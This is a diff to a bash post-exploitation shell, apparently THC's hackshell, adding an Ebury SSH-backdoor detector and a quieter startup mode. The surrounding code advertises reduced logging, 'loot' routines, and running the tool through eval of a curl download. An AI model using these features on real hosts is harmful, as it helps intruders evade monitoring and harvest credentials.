@@ -1313,7 +1313,7 @@ _warn_upx_exe() {
             _HS_UPX_PIDS+=("${pid}")
             str+="PID: $pid"$'\t'" $(stat -c '%U' "/proc/${pid}/exe")"$'\t'"$(strings /proc/${pid}/cmdline 2>/dev/null  | tr '[\r\n]' ' ' | cut -c -${COLUMNS:-80})"$'\n'
         }
-    done    
+    done
     [ -z "$str" ] && return
     echo -e "${CR}UPX packed processes found:${CF}"
     echo -en "${str}"$'\033[0m'
@@ -1331,6 +1331,35 @@ _hs_gdb_proc_match() {
             return 0
         }
     done
+}
+
+_detect_ebury() {
+    local st bin=$(readlink -f $(ldd -v $(command -v sshd 2>/dev/null) 2>/dev/null | grep -F 'keyutils' | awk '{print $3}' | head -n1) 2>/dev/null)
+    [ -z "$bin" ] && return
+
+    st=$(stat "${bin}")
+
+    rv=$(ls -l "${bin}")
+    [[ "$st" == *"-rwsr"* ]] && return 0 ## YES
+
+    v=$(stat --format='%s' "${bin}")
+    [ -n "$v" ] && [ "$v" -gt 32000 ] && return 0 ## YES
+
+    command -v nm >/dev/null && {
+        # Ebury binaries fail on nm -D
+        nm -D "${bin}" &>/dev/null || return 0 ## YES
+    }
+}
+
+# https://www.travismathison.com/posts/Decoding-Ebury-Malware-SSH-Commands/
+# https://web-assets.esetstatic.com/wls/en/papers/white-papers/ebury-is-alive-but-unseen.pdf
+# Pesty criminals mass owning. Fuck'm
+_warn_ebury() {
+    local rv
+    _detect_ebury || return
+
+    echo -e "${CR}Ebury backdoor detected.${CF}"
+    echo -e "$rv"$'\033[0m'
 }
 
 # Warn of script kiddies
@@ -1368,6 +1397,8 @@ _warn_skids() {
         echo -en "${CN}"
     }
     unset _HS_UPX_PIDS
+
+    _warn_ebury
 
     s="$(grep -F 'base64 -d' ~/.bashrc 2>/dev/null)"
     [ -n "$s" ] && {
@@ -2259,6 +2290,9 @@ hs_init_shell() {
     export TMPDIR
     [ -z "$XHOME" ] && export XHOME="${TMPDIR}/${T}"
 
+    # Do not execute lootlight on every new shell
+    [ -z "$_HS_HUSH" ] && [ -f "${XHOME}" ] && _HS_HUSH=1
+
     [ -z "$_HS_PATH_ORIG" ] && _HS_PATH_ORIG="$PATH"
     [ "${PATH:0:2}" != ".:" ] && export PATH=".:${PATH}"
     # Might already exist.
@@ -2361,21 +2395,25 @@ hs_init_alias
 hs_init_shell
 
 [ -z "$QUIET" ] && {
-    echo -e ">>> Type ${CDC}loot${CN} or ${CDC}xhelp${CN} to get your started"
-    # xhelp
-
-    ### Finishing
-    echo -e ">>> Type ${CDC}xhome${CN} to set HOME=${CDY}${XHOME}${CN}"
-    echo -e ">>> Tweaking environment variables to log less     ${CN}[${CDG}DONE${CN}]"
-    echo -e ">>> Creating aliases to make commands log less     ${CN}[${CDG}DONE${CN}]"
-    echo -e ">>> ${CG}Setup complete. ${CF}No data was written to the filesystem${CN}"
-    hs_info
-
-    # Warning if thc.org is used
-    [ -n "$_HSURLORIGIN" ] && HS_WARN "Better use: ' ${CDC}eval \"\$(curl -SsfL ${_HSURL})\"${CDM}'${CN}"
-
     ### Check for obvious loots
-    lootlight
+    [ -n "$_HS_HUSH" ] && echo -e ">>> Fast Mode. Type ${CDC}lootlight${CN} to loot."
+    [ -z "$_HS_HUSH" ] && {
+        echo -e ">>> Type ${CDC}loot${CN} or ${CDC}xhelp${CN} to get your started"
+        # xhelp
+
+        ### Finishing
+        echo -e ">>> Type ${CDC}xhome${CN} to set HOME=${CDY}${XHOME}${CN}"
+        echo -e ">>> Tweaking environment variables to log less     ${CN}[${CDG}DONE${CN}]"
+        echo -e ">>> Creating aliases to make commands log less     ${CN}[${CDG}DONE${CN}]"
+        echo -e ">>> ${CG}Setup complete. ${CF}No data was written to the filesystem${CN}"
+        hs_info
+
+        # Warning if thc.org is used
+        [ -n "$_HSURLORIGIN" ] && HS_WARN "Better use: ' ${CDC}eval \"\$(curl -SsfL ${_HSURL})\"${CDM}'${CN}"
+
+        lootlight
+    }
+    export _HS_HUSH=1
 }
 
 
